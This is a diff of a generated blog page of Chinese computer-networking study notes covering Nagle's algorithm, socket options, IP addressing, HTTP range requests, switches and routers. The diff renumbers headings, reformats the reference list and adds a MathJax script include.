+<h1 id="27-TCP中的Nagle算法"><a href="#27-TCP中的Nagle算法" class="headerlink" title="27. TCP中的Nagle算法"></a>27. TCP中的Nagle算法</h1><p>在使用一些协议通讯的时候，会有一个字节一个字节的发送的情景，每次发送一个字节的有用数据，就会产生 41 个字节长的分组，20 个字节的 IP Header 和 20 个字节的 TCP Header，这就导致了 1 个字节的有用信息要浪费掉 40 个字节的头部信息，这是一笔巨大的字节开销，而且这种小包在广域网上会增加拥塞的出现。</p>
 <p>TCP 总是希望尽可能的发送足够大的数据。(在一个连接中会设置 <code>MSS</code> 参数,因此,TCP/IP 希望每次都能够以 <code>MSS</code> 尺寸的数据块来发送数据)。Nagle 算法就是为了尽可能发送大块数据,避免网络中充斥着许多小数据块。</p>
 <p>Nagle 算法的基本定义是任意时刻,最多只能有一个未被确认的小段。所谓“小段”,指的是小于 <code>MSS</code> 尺寸的数据块,所谓“未被确认”,是指一个数据块发送出去后,没有收到对方发送的 ACK 确认该数据已收到.</p>
 <p>Nagle算法的规则(可参考 tcp_output.c 文件里 tcp_nagle_check 函数注释)：</p>
@@ -1411,7 +1464,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <h2 id="CORK-算法"><a href="#CORK-算法" class="headerlink" title="CORK 算法"></a>CORK 算法</h2><p>所谓的 CORK 就是塞子的意思，形象地理解就是用 CORK 将连接塞住,使得数据先不发出去,等到拔去塞子后再发出去。设置该选项后,内核会尽力把小数据包拼接成一个大的数据包(一个 MTU )再发送出去，当然若一定时间后(一般为 200 ms,该值尚待确认)，内核仍然没有组合成一个 MTU 时也必须发送现有的数据(不可能让数据一直等待)。</p>
 <p>但是，<code>TCP_CORK</code> 的实现可能并不那么完美，CORK 并不会将连接完全塞住。内核其实并不知道应用层到底什么时候会发送第二批数据用于和第一批数据拼接以达到 MTU 的大小，因此内核会给出一个时间限制，在该时间内没有拼接成一个大包(努力接近 MTU )的话,内核就会无条件发送。也就是说若应用层程序发送小包数据的间隔不够短时，TCP_CORK 就没有一点作用，反而失去了数据的实时性(每个小包数据都会延时一定时间再发送)。</p>
 <p><strong>Nagle 算法主要避免网络因为太多的小包(协议头的比例非常之大)而拥塞,而 CORK 算法则是为了提高网络的利用率</strong></p>
-<h1 id="27-Socket"><a href="#27-Socket" class="headerlink" title="27. Socket"></a>27. Socket</h1><p>TCP/UDP是由以下五元组唯一地识别的：</p>
+<h1 id="28-Socket"><a href="#28-Socket" class="headerlink" title="28. Socket"></a>28. Socket</h1><p>TCP/UDP是由以下五元组唯一地识别的：</p>
 <figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">&#123;<span class="hljs-tag">&lt;<span class="hljs-name">protocol</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">src</span> <span class="hljs-attr">addr</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">src</span> <span class="hljs-attr">port</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">dest</span> <span class="hljs-attr">addr</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">dest</span> <span class="hljs-attr">port</span>&gt;</span>&#125;<br></code></pre></div></td></tr></table></figure>
 
 <p>这些数值组成的任何独特的组合可以唯一地确认一个连接。对于任意连接，这五个值都不能完全相同。否则的话操作系统就无法区别这些连接了。</p>
@@ -1451,15 +1504,15 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <p>然而，如果在新的 socket 上设置了 <code>SO_REUSEADDR</code> 选项，如果此时有另一个 socket 绑定在当前的地址端口对且处于 TIME_WAIT 阶段，那么这个已存在的绑定关系将会被忽略。事实上处于 TIME_WAIT 阶段的 socket 已经是半关闭的状态，将一个新的 socket 绑定在这个地址端口对上不会有任何问题。这样的话原来绑定在这个端口上的 socket 一般不会对新的 socket 产生影响。</p>
 <h2 id="SO-REUSEPORT-的作用"><a href="#SO-REUSEPORT-的作用" class="headerlink" title="SO_REUSEPORT 的作用"></a>SO_REUSEPORT 的作用</h2><p>基本上来说，<code>SO_REUSEPORT</code> 允许<strong>将任意数目的 socket 绑定到完全相同的源地址端口对上</strong>，只要所有之前绑定的 socket 都设置了 <code>SO_REUSEPORT</code> 选项。如果第一个绑定在该地址端口对上的 socket 没有设置 <code>SO_REUSEPORT</code>，无论之后的 socket 是否设置 <code>SO_REUSEPORT</code>，其都无法绑定在与这个地址端口完全相同的地址上。除非第一个绑定在这个地址端口对上的 socket 释放了这个绑定关系。</p>
 <p>与 <code>SO_REUSEADDR</code> 不同的是 ，处理 <code>SO_REUSEPORT</code> 的代码不仅会检查当前尝试绑定的 socket 的 <code>SO_REUSEPORT</code>，而且也会检查之前已绑定了当前尝试绑定的地址端口对的 socket 的 <code>SO_REUSEPORT</code> 选项。</p>
-<h1 id="28-TCP和UDP可以同时监听相同的端口吗"><a href="#28-TCP和UDP可以同时监听相同的端口吗" class="headerlink" title="28. TCP和UDP可以同时监听相同的端口吗"></a>28. TCP和UDP可以同时监听相同的端口吗</h1><p>可以。</p>
+<h1 id="29-TCP和UDP可以同时监听相同的端口吗"><a href="#29-TCP和UDP可以同时监听相同的端口吗" class="headerlink" title="29. TCP和UDP可以同时监听相同的端口吗"></a>29. TCP和UDP可以同时监听相同的端口吗</h1><p>可以。</p>
 <p>端口可以形象地比喻成操作系统上的编号唯一的文件，应用程序和网络协议可以对其进行 i/o 操作。</p>
 <p>但是既然唯一又为何 tcp/udp 可以用相同的端口号呢？这样的话，程序在连接到端口时，怎么知道此时从该端口进来的数据是tcp的还是udp的呢？</p>
 <p>原因是 IP 数据包首部有个叫做协议的字段，指出了上层协议是 TCP 还是 UDP 还是其他P。</p>
 <p>协议字段，其值为6，则为TCP；其值为17，则为UDP。</p>
 <p>操作系统有能力根据接受的报文的 IP 字段里面的协议部分判断这个报文是什么报文，就是说，系统读数据的时候还没有读到上层报文（TCP/UDP）的时候已经知道上层是什么报文了，直接交给相关的内核进程或协议栈处理就可以了，而在同一个协议内部端口号唯一。</p>
-<h1 id="29-Controller-层如何获取到请求的信息"><a href="#29-Controller-层如何获取到请求的信息" class="headerlink" title="29. Controller 层如何获取到请求的信息"></a>29. Controller 层如何获取到请求的信息</h1><p>客户端发起的请求，都是 http 请求，controller 层对请求数据的解析是按照 json 还是 xml 的依据就是请求头 <code>content-type</code>。</p>
+<h1 id="30-Controller-层如何获取到请求的信息"><a href="#30-Controller-层如何获取到请求的信息" class="headerlink" title="30. Controller 层如何获取到请求的信息"></a>30. Controller 层如何获取到请求的信息</h1><p>客户端发起的请求，都是 http 请求，controller 层对请求数据的解析是按照 json 还是 xml 的依据就是请求头 <code>content-type</code>。</p>
 <p>请求报文中包含有请求方法以及对应的 URL，发送到 controller 之后，controller 对请求报文的正文进行解析。</p>
-<h1 id="30-IP地址"><a href="#30-IP地址" class="headerlink" title="30. IP地址"></a>30. IP地址</h1><p>IP 地址就是给互联网上的每一台主机（或路由器）的每一个接口分配在一个全世界范围内是唯一的32位的标识符。IP 地址可以划分为若干类，每一类地址都由两个固定长度的字段组成，其中第一个字段是<strong>网络号</strong>，它标志主机（或路由器）所连接到的网络。一个网络号在整个互联网范围内必须是唯一的。第二个字段是<strong>主机号</strong>，它标志该主机（或路由器）。</p>
+<h1 id="31-IP地址"><a href="#31-IP地址" class="headerlink" title="31. IP地址"></a>31. IP地址</h1><p>IP 地址就是给互联网上的每一台主机（或路由器）的每一个接口分配在一个全世界范围内是唯一的32位的标识符。IP 地址可以划分为若干类，每一类地址都由两个固定长度的字段组成，其中第一个字段是<strong>网络号</strong>，它标志主机（或路由器）所连接到的网络。一个网络号在整个互联网范围内必须是唯一的。第二个字段是<strong>主机号</strong>，它标志该主机（或路由器）。</p>
 <p>下图是各种 IP 地址的网络号字段和主机号字段，这里 A 类、B 类和 C 类地址都是单播地址（一对一通信），是最常用的。</p>
 <p><img src="https://qiniu.xiaoming.net.cn/IP%E5%9C%B0%E5%9D%80%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8F%B7%E5%AD%97%E6%AE%B5%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%8F%B7%E5%AD%97%E6%AE%B5.jpg" alt="IP地址中的网络号字段和主机号字段"></p>
 <p>IP地址，一共分成了5类，范围分别如下：</p>
@@ -1506,7 +1559,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <h3 id="C类私有IP地址："><a href="#C类私有IP地址：" class="headerlink" title="C类私有IP地址："></a>C类私有IP地址：</h3><ul>
 <li>192.168.0.0～192.168.255.255</li>
 </ul>
-<h1 id="31-IP-数据报"><a href="#31-IP-数据报" class="headerlink" title="31. IP 数据报"></a>31. IP 数据报</h1><p>IP 数据报的格式如下：</p>
+<h1 id="32-IP-数据报"><a href="#32-IP-数据报" class="headerlink" title="32. IP 数据报"></a>32. IP 数据报</h1><p>IP 数据报的格式如下：</p>
 <p><img src="https://qiniu.xiaoming.net.cn/IP%20%E6%95%B0%E6%8D%AE%E6%8A%A5%E6%A0%BC%E5%BC%8F.jpg" alt="IP 数据报格式"></p>
 <p>①版本：占 4 位，指 IP 协议的版本，目前广泛使用 IPv4； </p>
 <p>②首部长度：占 4 位，以 32 位为单位，常用长度为 20 字节，最大为 60 字节； </p>
@@ -1520,7 +1573,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <p>⑩首部检验和：占 16 位，只检验数据报的首部，不包括数据部分；</p>
 <p>⑪源地址：占 32 位，标识发送方的 IP 地址； </p>
 <p>⑫目的地址：占 32 位，标识接收方的 IP 地址。</p>
-<h1 id="32-如何进行断点续传"><a href="#32-如何进行断点续传" class="headerlink" title="32. 如何进行断点续传"></a>32. 如何进行断点续传</h1><p>在 HTTP/1.1 中，很明确的声明了一个响应头部 <code>Access-Ranges</code> 来标记是否支持范围请求，它只有一个可选参数 <code>bytes</code>。</p>
+<h1 id="33-如何进行断点续传"><a href="#33-如何进行断点续传" class="headerlink" title="33. 如何进行断点续传"></a>33. 如何进行断点续传</h1><p>在 HTTP/1.1 中，很明确的声明了一个响应头部 <code>Access-Ranges</code> 来标记是否支持范围请求，它只有一个可选参数 <code>bytes</code>。</p>
 <p>如果已经确定双端都支持范围请求，我们就可以在请求资源的时候使用它。所有的文件最终都是存储在磁盘或者内存中的字节，对于待操作的文件可以将其以字节为单位分割。这样只需要 HTTP 支持请求该文件从 n 到 n+x 这个范围内的资源，就可以实现范围请求了。</p>
 <p>HTTP/1.1 中定义了一个 <code>Ranges</code> 的请求头，来指定请求实体的范围。它的范围取值是在 <code>0 - Content-Length</code> 之间，使用 <code>-</code> 分割。</p>
 <p>例如已经下载了 1000 bytes 的资源内容，想接着继续下载之后的资源内容，只要在 HTTP 请求头部，增加 <code>Ranges:bytes=1000-</code> 就可以了。</p>
@@ -1551,11 +1604,11 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <blockquote>
 <p>HTTP 416 Range Not Satisfiable 错误状态码意味着服务器无法处理所请求的数据区间。最常见的情况是所请求的数据区间不在文件范围之内，也就是说，Range 首部的值，虽然从语法上来说是没问题的，但是从语义上来说却没有意义。</p>
 </blockquote>
-<h1 id="33-交换机"><a href="#33-交换机" class="headerlink" title="33. 交换机"></a>33. 交换机</h1><p>交换机属于数据链路层，具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。</p>
+<h1 id="34-交换机"><a href="#34-交换机" class="headerlink" title="34. 交换机"></a>34. 交换机</h1><p>交换机属于数据链路层，具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。</p>
 <p>正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。</p>
 <p>下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。</p>
 <p><img src="http://qiniu.xiaoming.net.cn/%E4%BA%A4%E6%8D%A2%E6%9C%BA.png" alt="交换机"></p>
-<h1 id="34-路由器"><a href="#34-路由器" class="headerlink" title="34. 路由器"></a>34. 路由器</h1><h2 id="路由器的结构"><a href="#路由器的结构" class="headerlink" title="路由器的结构"></a>路由器的结构</h2><p>路由器从功能上可以划分为：路由选择和分组转发。</p>
+<h1 id="35-路由器"><a href="#35-路由器" class="headerlink" title="35. 路由器"></a>35. 路由器</h1><h2 id="路由器的结构"><a href="#路由器的结构" class="headerlink" title="路由器的结构"></a>路由器的结构</h2><p>路由器从功能上可以划分为：路由选择和分组转发。</p>
 <p>分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。</p>
 <p><img src="http://qiniu.xiaoming.net.cn/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E7%BB%93%E6%9E%84.jpeg" alt="路由器的结构"></p>
 <h2 id="路由器分组转发流程"><a href="#路由器分组转发流程" class="headerlink" title="路由器分组转发流程"></a>路由器分组转发流程</h2><p>在路由器中的输入和输出端口之间没有直接连线，路由器在处理分组的过程中，会先把收到的分组放入缓存，接着查找转发表，找出到某个地址应该从哪个端口转发，再把分组送到适合的端口转发出去，具体过程如下：</p>
@@ -1608,7 +1661,27 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <p><img src="http://qiniu.xiaoming.net.cn/BGP%E5%8F%91%E8%A8%80%E4%BA%BA%E5%92%8C%E8%87%AA%E6%B2%BB%E7%B3%BB%E7%BB%9FAS%E7%9A%84%E5%85%B3%E7%B3%BB.png" alt="BGP 发言人与 AS 自治系统的关系"></p>
 <p><strong>参考内容</strong></p>
 <blockquote>
-<p>主要参考以下两篇博客以及相关博客推荐，因找的博客比较多，没注意记录，最后好多忘了在哪2333，如果有侵权，请及时联系我，非常抱歉。<br><a href="https://github.com/Snailclimb/JavaGuide" target="_blank" rel="noopener">https://github.com/Snailclimb/JavaGuide</a><br><a href="https://github.com/CyC2018/CS-Notes" target="_blank" rel="noopener">https://github.com/CyC2018/CS-Notes</a><br><a href="https://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">理解RESTful架构</a><br><a href="https://www.jianshu.com/p/406dc9785a78" target="_blank" rel="noopener">三次握手失败怎么办？</a><br><a href="https://blog.csdn.net/ce123_zhouwei/article/details/9050797" target="_blank" rel="noopener">TCP中的Nagle算法</a><br><a href="https://blog.csdn.net/wdscq1234/article/details/52432095" target="_blank" rel="noopener">TCP-IP详解：Nagle算法</a><br><a href="https://blog.csdn.net/Yaokai_AssultMaster/article/details/68951150" target="_blank" rel="noopener">浅析套接字中SO_REUSEPORT和SO_REUSEADDR的区别</a><br><a href="https://blog.51cto.com/12083623/2362539" target="_blank" rel="noopener">TCP和UDP可以同时监听相同的端口吗</a><br><a href="https://zhuanlan.zhihu.com/p/72616216" target="_blank" rel="noopener">十分钟搞懂HTTP和HTTPS协议？</a><br><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="noopener">关于HTTP协议，一篇就够了</a><br><a href="https://blog.csdn.net/David_xtd/article/details/25592925" target="_blank" rel="noopener">什么是公有IP地址？什么是私有IP地址？及各自范围介绍</a><br><a href="https://juejin.im/post/5b555f055188251af25700aa" target="_blank" rel="noopener">图解：HTTP 范围请求，助力断点续传、多线程下载的核心原理</a><br><a href="https://www.jianshu.com/p/b0b6b88fe9fe" target="_blank" rel="noopener">1- Https流程和原理</a><br><a href="https://www.zhihu.com/question/21647204" target="_blank" rel="noopener">502 Bad Gateway 怎么解决？</a><br><a href="https://www.jianshu.com/p/c1015f5ffa74" target="_blank" rel="noopener">进程间通信IPC (InterProcess Communication)</a><br><a href="https://blog.csdn.net/yscoder/article/details/77663435" target="_blank" rel="noopener">HTTP Keep-Alive是什么？如何工作？(理解TCP生命周期）</a><br><a href="https://www.cnblogs.com/sunsky303/p/10414146.html" target="_blank" rel="noopener">长连接及心跳保活原理简介</a><br><a href="https://segmentfault.com/a/1190000012894416" target="_blank" rel="noopener">TCP keepalive 和 http keep-alive</a><br><a href="https://segmentfault.com/q/1010000001640745" target="_blank" rel="noopener">REST与RPC有什么区别？</a><br><a href="https://baijiahao.baidu.com/s?id=1617168792520937104&wfr=spider&for=pc" target="_blank" rel="noopener">面试问题：REST与RPC区别？</a>  </p>
+<p>主要参考以下两篇博客以及相关博客推荐，因找的博客比较多，没注意记录，最后好多忘了在哪2333，如果有侵权，请及时联系我，非常抱歉。<br><a href="https://github.com/Snailclimb/JavaGuide" target="_blank" rel="noopener">https://github.com/Snailclimb/JavaGuide</a> </p>
+<p><a href="https://github.com/CyC2018/CS-Notes" target="_blank" rel="noopener">https://github.com/CyC2018/CS-Notes</a> </p>
+<p><a href="https://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">理解RESTful架构</a> </p>
+<p><a href="https://www.jianshu.com/p/406dc9785a78" target="_blank" rel="noopener">三次握手失败怎么办？</a> </p>
+<p><a href="https://blog.csdn.net/ce123_zhouwei/article/details/9050797" target="_blank" rel="noopener">TCP中的Nagle算法</a> </p>
+<p><a href="https://blog.csdn.net/wdscq1234/article/details/52432095" target="_blank" rel="noopener">TCP-IP详解：Nagle算法</a> </p>
+<p><a href="https://blog.csdn.net/Yaokai_AssultMaster/article/details/68951150" target="_blank" rel="noopener">浅析套接字中SO_REUSEPORT和SO_REUSEADDR的区别</a> </p>
+<p><a href="https://blog.51cto.com/12083623/2362539" target="_blank" rel="noopener">TCP和UDP可以同时监听相同的端口吗</a> </p>
+<p><a href="https://zhuanlan.zhihu.com/p/72616216" target="_blank" rel="noopener">十分钟搞懂HTTP和HTTPS协议？</a> </p>
+<p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="noopener">关于HTTP协议，一篇就够了</a> </p>
+<p><a href="https://blog.csdn.net/David_xtd/article/details/25592925" target="_blank" rel="noopener">什么是公有IP地址？什么是私有IP地址？及各自范围介绍</a> </p>
+<p><a href="https://juejin.im/post/5b555f055188251af25700aa" target="_blank" rel="noopener">图解：HTTP 范围请求，助力断点续传、多线程下载的核心原理</a> </p>
+<p><a href="https://www.jianshu.com/p/b0b6b88fe9fe" target="_blank" rel="noopener">1- Https流程和原理</a> </p>
+<p><a href="https://www.zhihu.com/question/21647204" target="_blank" rel="noopener">502 Bad Gateway 怎么解决？</a> </p>
+<p><a href="https://www.jianshu.com/p/c1015f5ffa74" target="_blank" rel="noopener">进程间通信IPC (InterProcess Communication)</a> </p>
+<p><a href="https://blog.csdn.net/yscoder/article/details/77663435" target="_blank" rel="noopener">HTTP Keep-Alive是什么？如何工作？(理解TCP生命周期）</a> </p>
+<p><a href="https://www.cnblogs.com/sunsky303/p/10414146.html" target="_blank" rel="noopener">长连接及心跳保活原理简介</a> </p>
+<p><a href="https://segmentfault.com/a/1190000012894416" target="_blank" rel="noopener">TCP keepalive 和 http keep-alive</a> </p>
+<p><a href="https://segmentfault.com/q/1010000001640745" target="_blank" rel="noopener">REST与RPC有什么区别？</a> </p>
+<p><a href="https://baijiahao.baidu.com/s?id=1617168792520937104&wfr=spider&for=pc" target="_blank" rel="noopener">面试问题：REST与RPC区别？</a> </p>
+<p><a href="https://www.cnblogs.com/xiaoqiangink/p/14106858.html" target="_blank" rel="noopener">快速了解公钥、私钥与证书</a></p>
 </blockquote>
 
             </div>
@@ -1938,5 +2011,20 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 <script  src="/js/boot.js" ></script>
 
 
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
